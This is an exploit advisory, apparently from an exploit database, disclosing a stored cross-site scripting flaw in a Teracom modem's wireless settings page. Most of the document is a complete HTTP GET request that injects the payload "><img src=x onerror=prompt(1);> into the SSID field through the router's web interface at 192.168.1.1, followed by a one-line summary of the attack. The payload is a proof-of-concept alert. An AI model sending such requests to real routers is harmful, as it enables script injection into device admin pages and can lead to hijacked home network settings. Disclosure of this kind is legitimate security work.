# Exploit Title: Teracom Modem Stored XSS Vulnerability
# Date: 19-01-2014
# Author: Rakesh S
# Software Link: http://www.teracom.in/
# Version:  T2-B-Gawv1.4U10Y-BI
# Tested on: Windows 7
# Code :
GET /webconfig/wlan/country.html/country?context=&wlanprofile=MIXED_G_WIFI&wlanstatus=on&country=INI&txpower=5&wlanmultitouni=on&TxRate=Automatic&chanselect=automatic&channel=4&essid="><img src=x onerror=prompt(1);>%3E&hidessid=off&security=wpawpa2&authmethodselect=psk&wpapp=---&pmkcaching=off&confirm=Confirm HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Proxy-Connection: keep-alive
Referer: http://192.168.1.1/webconfig/wlan/country.html
Cookie: httpTimeOut=None
Authorization: Basic VGhpc2lzbm90Ok15b3JnaW5hbHBhc3N3b3Jk

Attack details
The variable Network Name (SSID): has been set to "><img src=x onerror=prompt(1);>